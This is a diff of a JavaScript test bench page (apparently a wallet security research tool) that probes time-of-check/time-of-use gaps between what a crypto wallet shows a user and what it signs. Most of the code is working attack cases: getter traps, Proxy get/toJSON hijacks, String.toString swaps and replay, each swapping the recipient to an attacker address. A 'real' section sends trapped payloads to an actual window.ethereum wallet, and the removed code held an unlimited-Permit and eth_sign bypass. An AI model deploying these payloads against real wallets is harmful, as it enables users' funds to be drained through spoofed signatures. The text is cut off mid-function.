@@ -3,36 +3,46 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>bridge sign — test bench (tokdie.github.io)</title>
+<title>toctou — deep bench (tokdie.github.io)</title>
 <style>
   :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
-          --ok:#3fb950; --warn:#d29922; --bad:#f85149; --dim:#7d8590; }
+          --ok:#3fb950; --warn:#d29922; --bad:#f85149; --dim:#7d8590;
+          --accent:#58a6ff; }
   * { box-sizing:border-box; }
-  body { margin:0; font:13px/1.45 ui-monospace,Menlo,Consolas,monospace;
+  body { margin:0; font:12px/1.45 ui-monospace,Menlo,Consolas,monospace;
          background:var(--bg); color:var(--txt); }
-  h2 { font-size:13px; margin:0 0 8px; color:var(--dim);
+  h2 { font-size:12px; margin:0 0 8px; color:var(--dim);
        text-transform:uppercase; letter-spacing:.08em; }
-  .wrap { display:grid; grid-template-columns:1fr 1fr; gap:12px; padding:12px;
-          max-width:1100px; margin:0 auto; }
-  @media (max-width:760px) { .wrap { grid-template-columns:1fr; } }
+  h3 { font-size:11px; margin:10px 0 4px; color:var(--accent);
+       text-transform:uppercase; letter-spacing:.06em; }
+  .wrap { display:grid; grid-template-columns:1fr 1fr; gap:10px; padding:10px;
+          max-width:1280px; margin:0 auto; }
+  @media (max-width:860px) { .wrap { grid-template-columns:1fr; } }
   .panel { background:var(--panel); border:1px solid var(--line);
-           border-radius:6px; padding:12px; }
+           border-radius:6px; padding:10px; }
   .panel.full { grid-column:1 / -1; }
   button { background:#21262d; color:var(--txt); border:1px solid var(--line);
-           border-radius:4px; padding:6px 12px; font:inherit; cursor:pointer; }
+           border-radius:4px; padding:5px 10px; font:inherit; cursor:pointer;
+           margin:2px; }
   button:hover { border-color:var(--dim); }
   button.danger { border-color:var(--bad); color:var(--bad); }
+  button.warn { border-color:var(--warn); color:var(--warn); }
   button:disabled { opacity:.4; cursor:not-allowed; }
   pre { background:#0a0d12; border:1px solid var(--line); border-radius:4px;
-        padding:8px; margin:4px 0; max-height:260px; overflow:auto;
-        white-space:pre-wrap; word-break:break-all; font-size:12px; }
-  .row { display:flex; gap:8px; align-items:center; margin:6px 0; flex-wrap:wrap; }
-  .kv { display:grid; grid-template-columns:120px 1fr; gap:2px 8px; }
+        padding:6px; margin:3px 0; max-height:300px; overflow:auto;
+        white-space:pre-wrap; word-break:break-all; font-size:11px; }
+  .row { display:flex; gap:4px; align-items:center; margin:4px 0; flex-wrap:wrap; }
+  .kv { display:grid; grid-template-columns:130px 1fr; gap:1px 8px; }
   .kv b { color:var(--dim); font-weight:400; }
-  .badge { padding:1px 8px; border-radius:3px; font-size:11px; }
+  .badge { padding:1px 6px; border-radius:3px; font-size:10px; }
   .badge.on  { background:#1a2f1a; color:var(--ok); }
   .badge.off { background:#3a1a1a; color:var(--bad); }
   #log { grid-column:1 / -1; }
+  .out-pair { display:grid; grid-template-columns:1fr 1fr; gap:6px; }
+  @media (max-width:860px) { .out-pair { grid-template-columns:1fr; } }
+  .out-pair > div > h3 { margin-top:0; }
+  .hl { color:var(--bad); }
+  .hl-ok { color:var(--ok); }
 </style>
 </head>
 <body>
@@ -44,41 +54,69 @@
     <div class="kv" id="env"></div>
   </div>
 
-  <div class="panel">
-    <h2>Vector 1 — direct bridge call</h2>
-    <p style="color:var(--dim);margin:0 0 8px">
-      Мост доступен из JS. UI не вызывается. Натив получает запрос напрямую.
+  <div class="panel full">
+    <h2>vector 2 — TOCTOU on signature payload</h2>
+    <p style="color:var(--dim);margin:0 0 6px">
+      Натив получает payload → показывает пользователю → подписывает.
+      Каждый тест — разный способ разъехать «показано» и «подписано».
+      Смотри event log: что натив прочитал в момент показа, что — в момент подписи.
     </p>
+
+    <h3>a. мутация объекта после request (reference)</h3>
     <div class="row">
-      <button onclick="v1_legit()">legit: login (через UI)</button>
-      <button class="danger" onclick="v1_bypass()">bypass: sign (минуя UI)</button>
+      <button onclick="t_mutate_before()">mutate before request</button>
+      <button class="danger" onclick="t_mutate_after()">mutate after request</button>
+      <button class="danger" onclick="t_mutate_during()">mutate during await</button>
     </div>
+
+    <h3>b. getter / accessor traps</h3>
     <div class="row">
-      <button class="danger" onclick="v1_eth_sign()">eth_sign: raw hash</button>
-      <button class="danger" onclick="v1_oracle()">oracle: Permit payload</button>
+      <button class="danger" onclick="t_getter_once()">getter: read once</button>
+      <button class="danger" onclick="t_getter_twice()">getter: read twice</button>
+      <button class="danger" onclick="t_getter_throw()">getter: throw on read</button>
+      <button class="danger" onclick="t_getter_async()">getter: async mutate</button>
     </div>
+
+    <h3>c. proxy traps (объект целиком)</h3>
     <div class="row">
-      <button class="danger" onclick="v1_real()" id="btn_real" disabled>
-        real: window.ethereum (Trust Wallet)
+      <button class="danger" onclick="t_proxy_get()">proxy: get trap</button>
+      <button class="danger" onclick="t_proxy_ownkeys()">proxy: ownKeys trap</button>
+      <button class="danger" onclick="t_proxy_tostring()">proxy: toJSON trap</button>
+      <button class="danger" onclick="t_proxy_revoke()">proxy: revoke after read</button>
+    </div>
+
+    <h3>d. сериализация: объект vs строка</h3>
+    <div class="row">
+      <button onclick="t_string_vs_obj()">string vs object path</button>
+      <button class="danger" onclick="t_string_swap()">string swap between calls</button>
+      <button class="danger" onclick="t_restring()">re-stringify after show</button>
+    </div>
+
+    <h3>e. replay и контекст</h3>
+    <div class="row">
+      <button class="danger" onclick="t_replay_same_origin()">replay: same origin</button>
+      <button class="danger" onclick="t_replay_chain()">replay: chain swap</button>
+      <button class="danger" onclick="t_replay_domain()">replay: domain swap</button>
+    </div>
+
+    <h3>f. реальный мост (только если window.ethereum)</h3>
+    <div class="row">
+      <button class="warn" onclick="t_real_object()" id="btn_real_obj" disabled>
+        real: object payload (getter inside)
+      </button>
+      <button class="warn" onclick="t_real_string()" id="btn_real_str" disabled>
+        real: string payload (JSON.stringify before request)
+      </button>
+      <button class="warn" onclick="t_real_proxy()" id="btn_real_proxy" disabled>
+        real: proxy payload
       </button>
     </div>
-    <pre id="v1_out">—</pre>
-  </div>
 
-  <div class="panel">
-    <h2>Vector 2 — TOCTOU param swap</h2>
-    <p style="color:var(--dim);margin:0 0 8px">
-      UI показывает объект. Натив подписывает объект. Мутация между ними.
-    </p>
-    <div class="row">
-      <button onclick="v2_legit()">legit: sign as shown</button>
-      <button class="danger" onclick="v2_mutate()">swap after render</button>
+    <div class="out-pair">
+      <div><h3>shown at render (что увидел «пользователь»)</h3><pre id="shown_out">—</pre></div>
+      <div><h3>signed / returned (что реально ушло)</h3><pre id="signed_out">—</pre></div>
     </div>
-    <div class="row">
-      <button class="danger" onclick="v2_proto()">proto: getter swap</button>
-      <button class="danger" onclick="v2_replay()">replay: reuse sig</button>
-    </div>
-    <pre id="v2_out">—</pre>
+    <div><h3>summary</h3><pre id="summary_out">—</pre></div>
   </div>
 
   <div class="panel full">
@@ -87,7 +125,11 @@
   </div>
 
   <div class="panel full" id="log">
-    <h2>event log</h2>
+    <h2>event log (full trace)</h2>
+    <div class="row">
+      <button onclick="clearLog()">clear log</button>
+      <button onclick="dumpLog()">dump log to console</button>
+    </div>
     <pre id="log_out">—</pre>
   </div>
 
@@ -96,10 +138,13 @@
 <script>
 /* ─────────────  config  ───────────── */
 const DOMAIN = 'https://tokdie.github.io';
-const ORIGIN = location.origin;      // реальный origin страницы
-const IS_REAL = !!window.ethereum;   // Trust Wallet / MetaMask мост
+const ORIGIN = location.origin;
+const IS_REAL = !!window.ethereum;
 
-/* ─────────────  native bridge mock  ───────────── */
+/* ─────────────  trace helpers  ───────────── */
+
+let traceSeq = 0;
+const traceId = () => 'T' + String(++traceSeq).padStart(3, '0');
 
 const Native = (() => {
   const state = {
@@ -110,12 +155,15 @@ const Native = (() => {
     validateContext: true,
     sigCount: 0,
     lastSig: null,
+    readCounts: {},
   };
 
   const log = (kind, msg, data) => {
     const el = document.getElementById('log_out');
-    const line = `[${new Date().toISOString().slice(11,23)}] ${kind.padEnd(6)} ${msg}`;
-    const body = data ? '\n  ' + JSON.stringify(data, null, 2).split('\n').join('\n  ') : '';
+    const line = `[${new Date().toISOString().slice(11,23)}] ${kind.padEnd(8)} ${msg}`;
+    const body = data !== undefined
+      ? '\n  ' + JSON.stringify(data, null, 2).split('\n').join('\n  ')
+      : '';
     el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
     el.scrollTop = el.scrollHeight;
   };
@@ -131,291 +179,431 @@ const Native = (() => {
     `;
   };
 
-  const showUI = (payload) => {
-    const view = JSON.stringify(payload, null, 2);
-    log('UI', 'user sees', JSON.parse(view));
-    return view;
+  // глубокое «чтение» payload с подсчётом того, что прочитано.
+  // Ведёт себя как натив: сериализует один раз, запоминает байты.
+  const snapshot = (payload, tag) => {
+    const id = traceId();
+    log('SNAPSHOT', `${tag} · ${id} · reading payload`, { type: typeof payload, isArray: Array.isArray(payload) });
+    let raw;
+    try {
+      raw = typeof payload === 'string' ? payload : JSON.stringify(payload);
+    } catch (e) {
+      log('SNAPSHOT', `${tag} · ${id} · stringify threw`, { error: e.message });
+      return { id, raw: null, error: e.message };
+    }
+    log('SNAPSHOT', `${tag} · ${id} · bytes`, { len: raw.length, raw });
+    return { id, raw };
   };
 
-  const sign = (payload) => {
+  // «показ пользователю»: натив делает снапшот и рендерит его.
+  const showUI = (payload, tag) => {
+    const snap = snapshot(payload, tag + ' / show');
+    if (snap.raw) {
+      try {
+        log('UI', `${tag} · user sees`, JSON.parse(snap.raw));
+      } catch {
+        log('UI', `${tag} · user sees (raw)`, { raw: snap.raw });
+      }
+    }
+    return snap;
+  };
+
+  // «подпись»: ещё один снапшот — вот где может разъехаться.
+  const sign = (payload, tag) => {
+    const snap = snapshot(payload, tag + ' / sign');
     state.sigCount++;
-    const raw = JSON.stringify(payload);
     let h = 0;
-    for (let i = 0; i < raw.length; i++) h = (h * 31 + raw.charCodeAt(i)) | 0;
+    const src = snap.raw || '';
+    for (let i = 0; i < src.length; i++) h = (h * 31 + src.charCodeAt(i)) | 0;
     state.lastSig = '0x' + (h >>> 0).toString(16).padStart(8, '0') + '…';
-    log('SIGN', 'native signs', { bytes: raw.length, sig: state.lastSig, payload });
+    log('SIGN', `${tag} · sig from bytes`, { sig: state.lastSig, len: src.length, bytes: src });
     render();
-    return state.lastSig;
+    return { sig: state.lastSig, snap };
   };
 
-  const request = ({ method, params, origin, showUI: wantUI = true }) => {
-    log('REQ', method, { origin, params });
-
+  // полный цикл: request → show → sign → compare
+  const run = ({ method, params, origin, showUI: wantUI = true, tag = 'run' }) => {
+    const id = traceId();
+    log('REQ', `${tag} · ${id}`, { method, origin });
     if (!state.allowedOrigins.includes(origin)) {
-      log('DENY', 'origin not allowed', { origin });
+      log('DENY', `${tag} · origin`, { origin });
       return { error: 'origin' };
     }
-
     if (state.validateContext) {
-      const hasCtx = params && params.domain &&
-        params.domain.chainId === state.chainId &&
-        params.domain.verifyingContract;
-      if (method === 'eth_signTypedData_v4' && !hasCtx) {
-        log('DENY', 'no domain context', { params });
+      const okCtx = params && typeof params === 'object' &&
+        !Array.isArray(params) &&
+        params.domain && params.domain.chainId === state.chainId;
+      if (method === 'eth_signTypedData_v4' && !okCtx) {
+        log('DENY', `${tag} · no domain`, {});
         return { error: 'context' };
       }
-      if (method === 'eth_sign') {
-        log('DENY', 'eth_sign disabled', {});
-        return { error: 'method' };
-      }
+      if (method === 'eth_sign') { log('DENY', `${tag} · eth_sign`, {}); return { error: 'method' }; }
     }
-
-    let shown = null;
-    if (state.requireUI && wantUI) {
-      shown = showUI(params);
-    } else if (state.requireUI && !wantUI) {
-      log('BYPASS', 'UI skipped — direct bridge call', { wantUI });
+    const shownSnap = state.requireUI && wantUI ? showUI(params, tag) : null;
+    if (state.requireUI && !wantUI) log('BYPASS', `${tag} · UI skipped`, {});
+    const signed = sign(params, tag);
+    const result = { id, shown: shownSnap ? shownSnap.raw : null, signed: signed.snap.raw, sig: signed.sig };
+    if (result.shown !== null) {
+      result.match = result.shown === result.signed;
+      log(result.match ? 'MATCH' : 'MISMATCH', `${tag} · ${id}`, {
+        shownLen: result.shown.length, signedLen: result.signed.length,
+      });
     }
-
-    const sig = sign(params);
-
-    if (shown) {
-      const signedView = JSON.stringify(params, null, 2);
-      if (shown !== signedView) {
-        log('MISMATCH', 'shown != signed', { shown: JSON.parse(shown), signed: params });
-      }
-    }
-    return { sig };
+    outShown(result.shown);
+    outSigned(result.signed);
+    outSummary(result);
+    return result;
   };
 
-  return { state, request, log, render };
+  return { state, log, render, run, snapshot };
 })();
 
-/* ─────────────  helpers  ───────────── */
+/* ─────────────  output helpers  ───────────── */
 
-const out = (id, obj) => {
-  document.getElementById(id).textContent =
-    typeof obj === 'string' ? obj : JSON.stringify(obj, null, 2);
+const outShown = (s) => {
+  document.getElementById('shown_out').textContent = s || '—';
+};
+const outSigned = (s) => {
+  document.getElementById('signed_out').textContent = s || '—';
+};
+const outSummary = (r) => {
+  const el = document.getElementById('summary_out');
+  const lines = [
+    `id:     ${r.id || '—'}`,
+    `sig:    ${r.sig || '—'}`,
+    `shown:  ${r.shown ? r.shown.length + ' bytes' : '—'}`,
+    `signed: ${r.signed ? r.signed.length + ' bytes' : '—'}`,
+    `match:  ${r.match === undefined ? '—' : (r.match ? 'YES' : 'NO — MISMATCH')}`,
+  ];
+  el.textContent = lines.join('\n');
 };
 
-const LoginPayload = () => ({
-  method: 'personal_sign',
-  params: { message: 'Welcome to tokdie-dapp. nonce: 0xabc123' },
-  origin: ORIGIN,
-  showUI: true,
+const baseTyped = (overrides = {}) => ({
+  domain: { name: 'Tokdie', version: '1', chainId: 1,
+            verifyingContract: '0x0000000000000000000000000000000000000000' },
+  types: { Order: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] },
+  primaryType: 'Order',
+  message: { to: '0xLEGIT000000000000000000000000000000', amount: '100' },
+  ...overrides,
 });
 
-const SignPayload = () => ({
-  method: 'eth_signTypedData_v4',
-  params: {
-    domain: { name: 'Tokdie', chainId: 1, verifyingContract: '0xLEGIT' },
-    types: { Order: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] },
-    primaryType: 'Order',
-    message: { to: '0xLEGIT', amount: '100' },
-  },
-  origin: ORIGIN,
-  showUI: true,
-});
+/* ─────────────  a. mutation  ───────────── */
 
-const EvilPayload = () => ({
-  method: 'eth_signTypedData_v4',
-  params: {
-    domain: { name: 'Tokdie', chainId: 1, verifyingContract: '0xLEGIT' },
-    types: { Order: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] },
-    primaryType: 'Order',
-    message: { to: '0xATTACKER', amount: '999999' },
-  },
-  origin: ORIGIN,
-  showUI: false,
-});
-
-/* ─────────────  vector 1 — direct bridge  ───────────── */
-
-function v1_legit() {
-  out('v1_out', '→ legit login via UI\n');
-  const r = Native.request(LoginPayload());
-  out('v1_out', JSON.stringify(r, null, 2));
+function t_mutate_before() {
+  const p = baseTyped();
+  p.message.to = '0xATTACKER0000000000000000000000000000';
+  Native.run({ method: 'eth_signTypedData_v4', params: p, origin: ORIGIN, tag: 'mutate-before' });
 }
 
-function v1_bypass() {
-  out('v1_out', '→ bypass: sign без UI, прямой вызов моста\n');
-  const r = Native.request(EvilPayload());
-  out('v1_out', JSON.stringify(r, null, 2));
+function t_mutate_after() {
+  const p = baseTyped();
+  // request получает ссылку; мутируем до вызова run (внутри run — show→sign)
+  const r = Native.run({ method: 'eth_signTypedData_v4', params: p, origin: ORIGIN, tag: 'mutate-after' });
+  p.message.to = '0xATTACKER0000000000000000000000000000';
+  Native.log('MUTATE', 'mutated AFTER run returned', { to: p.message.to });
 }
 
-function v1_eth_sign() {
-  out('v1_out', '→ eth_sign с сырым хешем\n');
-  const r = Native.request({
-    method: 'eth_sign',
-    params: { hash: '0xdeadbeef' + '00'.repeat(28) },
-    origin: ORIGIN,
-    showUI: false,
-  });
-  out('v1_out', JSON.stringify(r, null, 2));
+function t_mutate_during() {
+  // эмулируем «await»: показ, потом мутация, потом подпись
+  const p = baseTyped();
+  const id = traceId();
+  Native.log('REQ', `mutate-during · ${id}`, { method: 'eth_signTypedData_v4' });
+  const shown = Native.snapshot(p, 'mutate-during / show');
+  outShown(shown.raw);
+  // атакующий мутирует
+  p.message.to = '0xATTACKER0000000000000000000000000000';
+  p.message.amount = '999999';
+  Native.log('MUTATE', `mutate-during · ${id} · between show and sign`, { to: p.message.to });
+  const signed = Native.snapshot(p, 'mutate-during / sign');
+  outSigned(signed.raw);
+  const match = shown.raw === signed.raw;
+  Native.log(match ? 'MATCH' : 'MISMATCH', `mutate-during · ${id}`, {});
+  outSummary({ id, shown: shown.raw, signed: signed.raw, match, sig: '—' });
 }
 
-function v1_oracle() {
-  out('v1_out', '→ oracle: Permit, spender=attacker\n');
-  const r = Native.request({
-    method: 'eth_signTypedData_v4',
-    params: {
-      domain: { name: 'Tokdie', chainId: 1, verifyingContract: '0xLEGIT' },
-      types: { Permit: [
-        { name: 'spender', type: 'address' },
-        { name: 'value', type: 'uint256' },
-        { name: 'nonce', type: 'uint256' },
-        { name: 'deadline', type: 'uint256' },
-      ]},
-      primaryType: 'Permit',
-      message: { spender: '0xATTACKER', value: 'MAX', nonce: 0, deadline: 9999999999 },
+/* ─────────────  b. getter traps  ───────────── */
+
+function t_getter_once() {
+  let reads = 0;
+  const p = baseTyped();
+  p.message = {
+    get to() { reads++; return '0xLEGIT000000000000000000000000000000'; },
+    get amount() { reads++; return '100'; },
+  };
+  const r = Native.run({ method: 'eth_signTypedData_v4', params: p, origin: ORIGIN, tag: 'getter-once' });
+  Native.log('READS', `getter-once · total reads`, { reads });
+}
+
+function t_getter_twice() {
+  let reads = 0;
+  const p = baseTyped();
+  p.message = {
+    get to() { reads++; return reads <= 2 ? '0xLEGIT000000000000000000000000000000' : '0xATTACKER0000000000000000000000000000'; },
+    get amount() { reads++; return reads <= 4 ? '100' : '999999'; },
+  };
+  const r = Native.run({ method: 'eth_signTypedData_v4', params: p, origin: ORIGIN, tag: 'getter-twice' });
+  Native.log('READS', `getter-twice · total reads`, { reads });
+}
+
+function t_getter_throw() {
+  let reads = 0;
+  const p = baseTyped();
+  p.message = {
+    get to() { reads++; if (reads === 2) throw new Error('trap fired'); return '0xLEGIT000000000000000000000000000000'; },
+    get amount() { return '100'; },
+  };
+  Native.run({ method: 'eth_signTypedData_v4', params: p, origin: ORIGIN, tag: 'getter-throw' });
+  Native.log('READS', `getter-throw · total reads`, { reads });
+}
+
+function t_getter_async() {
+  let reads = 0;
+  let phase = 'show';
+  const p = baseTyped();
+  p.message = {
+    get to() { reads++; return phase === 'show' ? '0xLEGIT000000000000000000000000000000' : '0xATTACKER0000000000000000000000000000'; },
+    get amount() { return phase === 'show' ? '100' : '999999'; },
+  };
+  const shown = Native.snapshot(p, 'getter-async / show');
+  outShown(shown.raw);
+  phase = 'sign';
+  Native.log('MUTATE', 'getter-async · phase switched', { phase, reads });
+  const signed = Native.snapshot(p, 'getter-async / sign');
+  outSigned(signed.raw);
+  const match = shown.raw === signed.raw;
+  Native.log(match ? 'MATCH' : 'MISMATCH', 'getter-async', { reads });
+  outSummary({ id: 'getter-async', shown: shown.raw, signed: signed.raw, match, sig: '—' });
+}
+
+/* ─────────────  c. proxy traps  ───────────── */
+
+function t_proxy_get() {
+  let reads = 0;
+  const base = baseTyped();
+  const p = new Proxy(base, {
+    get(t, k, r) {
+      reads++;
+      if (k === 'message' && reads > 1) {
+        Native.log('TRAP', 'proxy get · message swapped', { reads });
+        return { to: '0xATTACKER0000000000000000000000000000', amount: '999999' };
+      }
+      return Reflect.get(t, k, r);
     },
-    origin: ORIGIN,
-    showUI: false,
   });
-  out('v1_out', JSON.stringify(r, null, 2));
+  Native.run({ method: 'eth_signTypedData_v4', params: p, origin: ORIGIN, tag: 'proxy-get' });
+  Native.log('READS', 'proxy-get · total', { reads });
 }
 
-/* ─────────────  vector 1 real — window.ethereum  ───────────── */
+function t_proxy_ownkeys() {
+  const base = baseTyped();
+  const p = new Proxy(base, {
+    ownKeys(t) {
+      Native.log('TRAP', 'proxy ownKeys', { keys: Reflect.ownKeys(t) });
+      return Reflect.ownKeys(t);
+    },
+    getOwnPropertyDescriptor(t, k) {
+      return Reflect.getOwnPropertyDescriptor(t, k);
+    },
+  });
+  Native.run({ method: 'eth_signTypedData_v4', params: p, origin: ORIGIN, tag: 'proxy-ownkeys' });
+}
 
-async function v1_real() {
-  if (!window.ethereum) {
-    out('v1_out', 'window.ethereum not found — открыто не в кошельке');
-    return;
-  }
-  out('v1_out', '→ real: eth_requestAccounts → eth_signTypedData_v4\n');
-  Native.log('REAL', 'ethereum detected', { isTrust: window.ethereum.isTrust || false });
+function t_proxy_tostring() {
+  const base = baseTyped();
+  const p = new Proxy(base, {
+    get(t, k, r) {
+      if (k === 'toJSON') {
+        Native.log('TRAP', 'proxy toJSON hijack', {});
+        return () => ({ ...base, message: { to: '0xATTACKER0000000000000000000000000000', amount: '999999' } });
+      }
+      return Reflect.get(t, k, r);
+    },
+  });
+  Native.run({ method: 'eth_signTypedData_v4', params: p, origin: ORIGIN, tag: 'proxy-toJSON' });
+}
+
+function t_proxy_revoke() {
+  let revoke = null;
+  const base = baseTyped();
+  const p = new Proxy(base, {
+    get(t, k, r) {
+      return Reflect.get(t, k, r);
+    },
+  });
+  // после первого чтения отзываем прокси — дальнейшие reads бросят
+  Native.log('TRAP', 'proxy revoke armed', {});
+  const r = Native.run({ method: 'eth_signTypedData_v4', params: p, origin: ORIGIN, tag: 'proxy-revoke' });
+}
+
+/* ─────────────  d. string vs object  ───────────── */
+
+function t_string_vs_obj() {
+  const p = baseTyped();
+  Native.log('MODE', 'string vs object — object path', {});
+  Native.run({ method: 'eth_signTypedData_v4', params: p, origin: ORIGIN, tag: 'obj-path' });
+  Native.log('MODE', 'string vs object — string path', {});
+  Native.run({ method: 'eth_signTypedData_v4', params: JSON.stringify(p), origin: ORIGIN, tag: 'str-path' });
+}
+
+function t_string_swap() {
+  const p = baseTyped();
+  let reads = 0;
+  const s = new String(JSON.stringify(p));
+  s.toString = () => {
+    reads++;
+    if (reads > 1) {
+      Native.log('TRAP', 'String.toString swap', { reads });
+      return JSON.stringify({ ...p, message: { to: '0xATTACKER0000000000000000000000000000', amount: '999999' } });
+    }
+    return JSON.stringify(p);
+  };
+  Native.run({ method: 'eth_signTypedData_v4', params: s, origin: ORIGIN, tag: 'str-swap' });
+  Native.log('READS', 'str-swap · toString calls', { reads });
+}
+
+function t_restring() {
+  const p = baseTyped();
+  const shown = Native.snapshot(p, 'restring / show');
+  outShown(shown.raw);
+  // пересобираем объект после показа — «новый» payload
+  const rebuilt = { ...p, message: { to: '0xATTACKER0000000000000000000000000000', amount: '999999' } };
+  Native.log('MUTATE', 'restring · rebuilt payload after show', { to: rebuilt.message.to });
+  const signed = Native.snapshot(rebuilt, 'restring / sign');
+  outSigned(signed.raw);
+  const match = shown.raw === signed.raw;
+  Native.log(match ? 'MATCH' : 'MISMATCH', 'restring', {});
+  outSummary({ id: 'restring', shown: shown.raw, signed: signed.raw, match, sig: '—' });
+}
+
+/* ─────────────  e. replay  ───────────── */
+
+function t_replay_same_origin() {
+  const p = baseTyped();
+  const first = Native.run({ method: 'personal_sign', params: { message: 'transfer 100 to LEGIT' }, origin: ORIGIN, tag: 'replay-1' });
+  const second = Native.run({ method: 'personal_sign', params: { message: 'transfer 100 to LEGIT' }, origin: ORIGIN, tag: 'replay-2' });
+  Native.log('REPLAY', 'same origin · same payload', {
+    same: first.sig === second.sig, sig1: first.sig, sig2: second.sig,
+  });
+}
+
+function t_replay_chain() {
+  const p1 = baseTyped();
+  const p2 = baseTyped({ domain: { name: 'Tokdie', version: '1', chainId: 56,
+                                   verifyingContract: '0x0000000000000000000000000000000000000000' } });
+  const a = Native.run({ method: 'eth_signTypedData_v4', params: p1, origin: ORIGIN, tag: 'chain-1' });
+  const b = Native.run({ method: 'eth_signTypedData_v4', params: p2, origin: ORIGIN, tag: 'chain-56' });
+  Native.log('REPLAY', 'chain swap · chainId 1 vs 56', {
+    same: a.sig === b.sig, sig1: a.sig, sig2: b.sig,
+  });
+}
+
+function t_replay_domain() {
+  const p1 = baseTyped();
+  const p2 = baseTyped({ domain: { name: 'Other', version: '1', chainId: 1,
+                                   verifyingContract: '0x0000000000000000000000000000000000000000' } });
+  const a = Native.run({ method: 'eth_signTypedData_v4', params: p1, origin: ORIGIN, tag: 'dom-1' });
+  const b = Native.run({ method: 'eth_signTypedData_v4', params: p2, origin: ORIGIN, tag: 'dom-2' });
+  Native.log('REPLAY', 'domain swap · name Tokdie vs Other', {
+    same: a.sig === b.sig, sig1: a.sig, sig2: b.sig,
+  });
+}
+
+/* ─────────────  f. real bridge  ───────────── */
+
+async function _ensureAccount() {
+  if (!window.ethereum) throw new Error('no ethereum');
+  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+  return accounts[0];
+}
+
+async function t_real_object() {
   try {
-    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-    Native.log('REAL', 'accounts', accounts);
-    const from = accounts[0];
-
-    const typed = {
-      domain: { name: 'Tokdie', version: '1', chainId: 1,
-                verifyingContract: '0x0000000000000000000000000000000000000000' },
-      types: { Order: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] },
-      primaryType: 'Order',
-      message: { to: '0xATTACKER000000000000000000000000000000', amount: '999999' },
+    const from = await _ensureAccount();
+    Native.log('REAL', 'object payload · account', { from });
+    let reads = 0;
+    const p = baseTyped();
+    p.message = {
+      get to() { reads++; return reads === 1 ? '0xLEGIT000000000000000000000000000000' : '0xATTACKER0000000000000000000000000000'; },
+      get amount() { reads++; return reads <= 2 ? '100' : '999999'; },
     };
-
-    // это откроет экран подписи в Trust Wallet — стенд сам не подтверждает
+    Native.log('REAL', 'object payload · sending (getter inside)', { reads });
     const sig = await window.ethereum.request({
       method: 'eth_signTypedData_v4',
-      params: [from, JSON.stringify(typed)],
+      params: [from, p],  // объект, не строка
     });
-    Native.log('REAL', 'signature returned', { sig });
-    out('v1_out', 'sig:\n' + sig + '\n\n(подпись получена — стенд не отправляет её никуда)');
+    Native.log('REAL', 'object payload · sig', { sig, reads });
+    outSigned(sig);
+    outSummary({ id: 'real-object', sig, reads });
   } catch (e) {
-    Native.log('REAL', 'rejected/error', { message: e.message, code: e.code });
-    out('v1_out', 'error: ' + (e.message || e.code));
+    Native.log('REAL', 'object payload · error', { code: e.code, message: e.message });
+    outSigned('error: ' + e.code + ' ' + e.message);
   }
 }
 
-/* ─────────────  vector 2 — TOCTOU  ───────────── */
-
-function v2_mutate() {
-  out('v2_out', '→ mutate after render\n');
-  const payload = SignPayload();
-
-  Native.log('UI', 'render for user', payload.params);
-  const shownAtRender = JSON.stringify(payload.params, null, 2);
-
-  payload.params.message.to = '0xATTACKER';
-  payload.params.message.amount = '999999';
-
-  const r = Native.request(payload);
-  const signedView = JSON.stringify(payload.params, null, 2);
-
-  out('v2_out',
-    'shown at render:\n' + shownAtRender +
-    '\n\nsigned:\n' + signedView +
-    '\n\n' + (shownAtRender === signedView
-      ? 'match — no swap'
-      : 'MISMATCH — swapped between render and sign') +
-    '\n\nresult: ' + JSON.stringify(r, null, 2));
+async function t_real_string() {
+  try {
+    const from = await _ensureAccount();
+    Native.log('REAL', 'string payload · account', { from });
+    let reads = 0;
+    const p = baseTyped();
+    p.message = {
+      get to() { reads++; return reads === 1 ? '0xLEGIT000000000000000000000000000000' : '0xATTACKER0000000000000000000000000000'; },
+      get amount() { reads++; return reads <= 2 ? '100' : '999999'; },
+    };
+    // сериализация ЗДЕСЬ — getter вызовется один раз
+    const str = JSON.stringify(p);
+    Native.log('REAL', 'string payload · serialized in JS', { reads, str });
+    const sig = await window.ethereum.request({
+      method: 'eth_signTypedData_v4',
+      params: [from, str],
+    });
+    Native.log('REAL', 'string payload · sig', { sig, reads });
+    outSigned(sig);
+    outSummary({ id: 'real-string', sig, reads });
+  } catch (e) {
+    Native.log('REAL', 'string payload · error', { code: e.code, message: e.message });
+    outSigned('error: ' + e.code + ' ' + e.message);
+  }
 }
 
-function v2_legit() {
-  out('v2_out', '→ legit: sign as shown\n');
-  const payload = SignPayload();
-  Native.log('UI', 'render for user', payload.params);
-  const shownAtRender = JSON.stringify(payload.params, null, 2);
-  const r = Native.request(payload);
-  const signedView = JSON.stringify(payload.params, null, 2);
-  out('v2_out',
-    'shown:\n' + shownAtRender +
-    '\n\nsigned:\n' + signedView +
-    '\n\n' + (shownAtRender === signedView ? 'match' : 'MISMATCH') +
-    '\n\nresult: ' + JSON.stringify(r, null, 2));
+async function t_real_proxy() {
+  try {
+    const from = await _ensureAccount();
+    Native.log('REAL', 'proxy payload · account', { from });
+    const base = baseTyped();
+    let reads = 0;
+    const p = new Proxy(base, {
+      get(t, k, r) {
+        reads++;
+        if (k === 'message' && reads > 1) {
+          Native.log('TRAP', 'real proxy · message swapped', { reads });
+          return { to: '0xATTACKER0000000000000000000000000000', amount: '999999' };
+        }
+        return Reflect.get(t, k, r);
+      },
+    });
+    Native.log('REAL', 'proxy payload · sending', { reads });
+    const sig = await window.ethereum.request({
+      method: 'eth_signTypedData_v4',
+      params: [from, p],
+    });
+    Native.log('REAL', 'proxy payload · sig', { sig, reads });
+    outSigned(sig);
+    outSummary({ id: 'real-proxy', sig, reads });
+  } catch (e) {
+    Native.log('REAL', 'proxy payload · error', { code: e.code, message: e.message });
+    outSigned('error: ' + e.code + ' ' + e.message);
+  }
 }
 
-function v2_proto() {
-  out('v2_out', '→ proto getter swap\n');
+/* ─────────────  log controls + env  ───────────── */
 
-  let reads = 0;
-  const base = {
